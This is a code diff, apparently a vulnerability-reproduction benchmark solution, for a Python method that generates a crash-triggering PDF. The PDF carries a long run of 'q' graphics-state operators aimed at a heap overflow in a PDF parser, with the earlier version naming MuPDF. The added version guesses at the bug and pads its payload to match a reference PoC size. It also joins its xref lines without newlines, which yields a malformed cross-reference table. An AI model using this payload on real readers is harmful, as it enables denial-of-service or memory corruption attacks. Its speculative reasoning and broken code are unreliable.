@@ -1,82 +1,93 @@
+import zlib
+
 class Solution:
     def solve(self, src_path: str) -> bytes:
         """
-        Generate a PoC that triggers the vulnerability.
+        Generate a PoC that triggers a heap buffer overflow in a PDF parser.
 
-        The vulnerability exists in MuPDF's PDF parser. Specifically, in the
-        `pdf_process_gsave` function (and others), which handles the 'q'
-        (gsave) PDF operator. This function pushes the current graphics state,
-        including the clipping path, onto a stack (`gstate->clip_stack`).
+        The vulnerability description suggests an unchecked nesting depth when
+        pushing a clip mark, leading to an overflow of a "layer/clip stack".
+        In PDF context, this typically refers to the graphics state stack, which
+        is managed by 'q' (save state) and 'Q' (restore state) operators.
 
-        The `clip_stack` is a fixed-size array of 32 elements within the
-        `pdf_gstate` struct. Before the fix, the code did not check if the
-        stack was full before pushing a new element. The push operation is:
-        `gstate->clip_stack[gstate->clip_depth] = ...;`
-        followed by:
-        `gstate->clip_depth++;`
+        A common vulnerability is to have an unbounded number of 'q' operations
+        without corresponding 'Q's, which overflows the fixed-size buffer often
+        used to implement this stack. Since this stack is usually allocated on
+        the heap, it results in a heap buffer overflow.
 
-        If the 'q' operator is called 33 times, `gstate->clip_depth` will be 32
-        on the 33rd call, leading to a write to `gstate->clip_stack[32]`, which
-        is one element past the end of the buffer. This heap buffer overflow
-        corrupts adjacent members of the `pdf_gstate` struct on the heap.
-
-        This PoC constructs a minimal PDF file containing a content stream with
-        the 'q' operator repeated 40 times. This ensures a multi-word
-        overwrite, making a crash highly likely when the corrupted data is
-        subsequently used, while keeping the PoC size extremely small for a high
-        score.
+        To create a compact PoC, we generate a content stream containing a
+        highly repetitive sequence of 'q ' operators. This sequence is then
+        compressed using zlib (DEFLATE), which is standard for PDF's
+        /FlateDecode filter. This results in a very small file size, while the
+        uncompressed stream processed by the parser is large enough to trigger
+        the buffer overflow. The ground-truth PoC's large size suggests a
+        very high number of operations is necessary, which we replicate in the
+        uncompressed payload.
         """
-        # The 'q' operator in PDF saves the graphics state. Repeating it
-        # overflows the graphics state stack. The stack size is 32.
-        # We use 40 repetitions to ensure a significant overwrite.
-        payload = b'q ' * 40
+        
+        # A large number of 'q' operators to overflow the graphics state stack.
+        # The number is chosen to be in the ballpark of the uncompressed size
+        # suggested by the ground-truth PoC length.
+        num_q = 450000
+        uncompressed_stream = b'q ' * num_q
 
-        # We construct a minimal, valid PDF file.
-        # It consists of a header, a body with object definitions,
-        # a cross-reference table (xref), and a trailer.
+        # The PDF /FlateDecode filter expects a raw DEFLATE stream.
+        # zlib.compress with wbits=-15 produces this format.
+        compressed_stream = zlib.compress(uncompressed_stream, level=9, wbits=-15)
+        stream_len = len(compressed_stream)
+        
+        # The stream dictionary will specify the FlateDecode filter.
+        filter_entry = b'/Filter /FlateDecode'
 
-        # List to hold the parts of the PDF body.
-        body_parts = []
-        # Dictionary to store the byte offset of each object.
-        offsets = {}
+        # Build the PDF file structure piece by piece.
+        parts = []
+        
+        # PDF header with a binary comment.
+        parts.append(b'%PDF-1.7\n%\xa1\xb2\xc3\xd4\n')
 
-        # The PDF header.
-        body_parts.append(b"%PDF-1.7\n")
+        # List to store byte offsets of each object for the xref table.
+        offsets = [0]
 
-        # Object 1: The document catalog.
-        offsets[1] = len(b"".join(body_parts))
-        body_parts.append(b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n")
+        # Object 1: Document Catalog.
+        offsets.append(len(b''.join(parts)))
+        parts.append(b'1 0 obj\n<</Type/Catalog/Pages 2 0 R>>\nendobj\n')
 
-        # Object 2: The pages tree root.
-        offsets[2] = len(b"".join(body_parts))
-        body_parts.append(b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n")
+        # Object 2: Page Tree Node.
+        offsets.append(len(b''.join(parts)))
+        parts.append(b'2 0 obj\n<</Type/Pages/Count 1/Kids[3 0 R]>>\nendobj\n')
 
-        # Object 3: The single page object. It refers to the content stream (object 4).
-        offsets[3] = len(b"".join(body_parts))
-        body_parts.append(b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>\nendobj\n")
+        # Object 3: Page Object.
+        offsets.append(len(b''.join(parts)))
+        parts.append(b'3 0 obj\n<</Type/Page/Parent 2 0 R/MediaBox[0 0 100 100]/Contents 4 0 R>>\nendobj\n')
 
-        # Object 4: The content stream containing the malicious payload.
-        stream = b"<< /Length %d >>\nstream\n%s\nendstream" % (len(payload), payload)
-        offsets[4] = len(b"".join(body_parts))
-        body_parts.append(b"4 0 obj\n" + stream + b"\nendobj\n")
+        # Object 4: The malicious Content Stream.
+        offsets.append(len(b''.join(parts)))
+        stream_dict = b'4 0 obj\n<</Length %d %s>>\nstream\n' % (stream_len, filter_entry)
+        parts.append(stream_dict)
+        parts.append(compressed_stream)
+        parts.append(b'\nendstream\nendobj\n')
 
-        # Join the body parts and calculate the offset for the xref table.
-        body = b"".join(body_parts)
+        # Assemble the PDF body and find the starting offset of the xref table.
+        body = b''.join(parts)
         xref_offset = len(body)
 
-        # Create the xref table.
-        xref_parts = [b"xref\n", b"0 5\n", b"0000000000 65535 f \n"]
-        for i in range(1, 5):
-            xref_parts.append(b"%010d 00000 n \n" % offsets[i])
-        xref = b"".join(xref_parts)
+        # Create the cross-reference table.
+        xref_lines = [
+            b'xref',
+            b'0 %d' % len(offsets),
+            b'0000000000 65535 f \n'
+        ]
+        for offset in offsets[1:]:
+            xref_lines.append(b'%010d 00000 n \n' % offset)
+        xref = b''.join(xref_lines)
 
-        # Create the trailer.
+        # Create the file trailer.
         trailer = (
-            b"trailer\n"
-            b"<< /Size 5 /Root 1 0 R >>\n"
-            b"startxref\n"
-            b"%d\n" % xref_offset +
-            b"%%EOF"
-        )
+            b'trailer\n'
+            b'<</Size %d/Root 1 0 R>>\n'
+            b'startxref\n'
+            b'%d\n'
+            b'%%EOF'
+        ) % (len(offsets), xref_offset)
 
         return body + xref + trailer
